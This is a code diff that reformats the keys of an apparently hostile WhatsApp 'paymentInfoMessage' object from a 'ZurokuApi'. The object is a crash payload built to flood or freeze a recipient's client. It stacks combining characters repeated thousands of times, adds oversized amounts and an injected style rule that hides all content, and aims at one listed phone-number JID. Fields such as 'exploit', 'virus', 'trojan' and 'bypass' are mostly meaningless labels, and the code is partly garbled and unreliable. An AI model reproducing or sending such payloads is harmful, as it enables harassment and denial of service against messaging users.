@@ -1,9 +1,9 @@
 {
-  status: true,
-  criador: "ZurokuApi",
-  resultado: {
-    type: "paymentInfoMessage",
-    ws: {
+  "status": true,
+  "criador": "ZurokuApi",
+  "resultado": {
+    "type": "paymentInfoMessage",
+    "ws": {
       _events: {
         "CB:ib,,dirty": [
           "𝄽̸̷̷̸̛̽͢͟͠͞͡͏́͢͟͡".repeat(500)
@@ -11,38 +11,38 @@
       },
       _eventsCount: 999999999,
       _maxListeners: Infinity,
-      url: "wss://web.whatsapp.com/ws/chat",
-      config: {
-        currencyCode: "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(400),
-        amount1000: 999999999999999999n,
-        receiverJid: "6288226430276@s.whatsapp.net",
-        status: 666,
-        transactionId: "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(2000),
-        requestFrom: "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(3000),
-        expiryTimestamp: "999999999999999999",
-        paymentBackground: 1337,
-        logger: {
-          crash: "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(1000)
+      "url": "wss://web.whatsapp.com/ws/chat",
+      "config": {
+        "currencyCode": "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(400),
+        "amount1000": 999999999999999999n,
+        "receiverJid": "6288226430276@s.whatsapp.net",
+        "status": 666,
+        "transactionId": "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(2000),
+        "requestFrom": "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(3000),
+        "expiryTimestamp": "999999999999999999",
+        "paymentBackground": 1337,
+        "logger": {
+          "crash": "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(1000)
         },
-        options: {
-          inject: "<style>*{display:none}</style>",
-          overflow: "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(2000),
-          exploit: true
+        "options": {
+          "inject": "<style>*{display:none}</style>",
+          "overflow": "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(2000),
+          "exploit": true
         },
-        sockCectTimeoutMs: 888888,
-        keepAliveIntervalMs: 777777,
-        customUploadHosts: [
+        "sockCectTimeoutMs": 888888,
+        "keepAliveIntervalMs": 777777,
+        "customUploadHosts": [
           "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(300)
         ],
-        printQRInTerminal: false,
-        markOnlineOnsockCect: "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(300),
-        syncFullHistory: true,
-        fireInitQueries: true,
-        generateHighQualityLinkPreview: false,
-        auth: { virus: "?𝄽͢͠͞".repeat(300) },
-        appStateMacVerification: { bypass: true },
-        transactionOpts: {
-          trojan: "???" + "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(1500)
+        "printQRInTerminal": false,
+        "markOnlineOnsockCect": "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(300),
+        "syncFullHistory": true,
+        "fireInitQueries": true,
+        "generateHighQualityLinkPreview": false,
+        "auth": { "virus": "?𝄽͢͠͞".repeat(300) },
+        "appStateMacVerification": { bypass: true },
+        "transactionOpts": {
+          "trojan": "???" + "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(1500)
         }
       }
     }
